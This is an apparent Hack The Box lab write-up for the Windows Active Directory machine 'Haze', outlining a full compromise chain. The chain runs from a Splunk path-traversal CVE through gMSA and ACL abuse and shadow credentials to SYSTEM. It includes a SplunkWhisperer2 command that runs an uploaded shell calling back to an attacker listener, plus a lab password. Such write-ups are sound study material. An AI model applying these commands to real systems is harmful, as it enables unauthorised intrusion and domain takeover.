---
public: "true"
tags:
  - "#htb"
  - Windows
  - Active-Directory
  - "#GMSA"
  - "#CVE-2024-36991"
created-at: 2026-04-01
---

# Information

- Machine name: Haze
- OS: Windows
- Difficulty: Hard

# Attack Path

1. CVE-2024-36991 (path traversal and file read)
2. read splunk.secret and authentication.conf to decode LDAP password for paul.taylor with <https://github.com/HurricaneLabs/splunksecrets>
3. Enumerate more users (rid cycling is possible. I used the usernames from splunk passwd and bruteforced last names to get to mark.adams)
4. Password reuse for mark.adams
5. Bloodhound enumeration
6. gmsa user abuse to read backup gmsa password
7. New bloodhound enumeration and see user edward.martin.
8. Exploit gmsa user acl to set owner for group support_services. Add user to group
9. Group has AddKeyCredentialLink for edward.martin
10. Add shadow credentials with certipy
11. edward.martin has psremote, can read splunk backup with new legacy encoded password (use same repo as before)
12. Get credentials for splunk admin web interface
13. Use <https://github.com/cnotin/SplunkWhisperer2/> as below (important to grant read and executable rights)

```shell
*Evil-WinRM* PS C:\windows\tasks> icacls shell.exe /grant Everyone:RX
processed file: shell.exe
Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\windows\tasks>

KALI> python PySplunkWhisperer2_remote.py --host haze.htb --lhost 10.10.16.9 --lport 1337 --username admin --password 'Sp1unkadmin@2k24' --payload 'cmd.exe /c "C:\windows\tasks\shell.exe"'
```

14. Get shell as alexander.green with impersonate privilege
15. getsystem on meterpreter.

# Lessons Learned

- Restricted accounts (first user paul.taylor got very fuzzy results. Could not read usernames etc). Second user could not see the user edward.martin -> Always rerun bloodhound
- Important to grant RX on shells I upload, so that other users can run them.
